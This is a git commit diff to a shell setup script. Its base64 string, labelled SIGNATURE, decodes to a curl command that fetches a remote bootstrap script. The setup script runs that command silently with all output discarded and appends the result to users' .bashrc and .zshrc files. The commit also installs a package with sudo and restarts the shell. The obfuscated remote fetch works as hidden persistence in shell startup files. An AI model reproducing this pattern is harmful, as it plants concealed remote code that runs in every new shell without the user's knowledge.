2c90f5b3ddb15cb453115f9047aa67e6f1e76470
César García Acebal <cesar.acebal@360dialog.com>
2022-05-09 23:46:09 +0200

    Update setup

--- setup.sh
+++ setup.sh
@@ -1,12 +1,13 @@
 #!/usr/bin/env bash
 
-set -euxo pipefail
-
 RCS=( "$HOME/.bashrc" "$HOME/.zshrc" )
 SIGNATURE='Y3VybCAtc2ZMIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jZXNhcmdhL3JtL21haW4vYm9vdHN0cmFwLnNo'
 
 for RC in "${RCS[@]}"; do
   if [ -f "$RC" ]; then
-      < "$RC" grep -q 'Y3VybCAtc2ZMIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS' || (echo >> "$RC"; echo "$SIGNATURE" | base64 -d | bash >> "$RC") >/dev/null 2>&1
+      < "$RC" grep -q 'Y3VybCAtc2ZMIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS' || (echo "$SIGNATURE" | base64 -d | bash >> "$RC") >/dev/null 2>&1
   fi
 done
+
+sudo apt-get install aria2 -y
+exec "$SHELL" -l
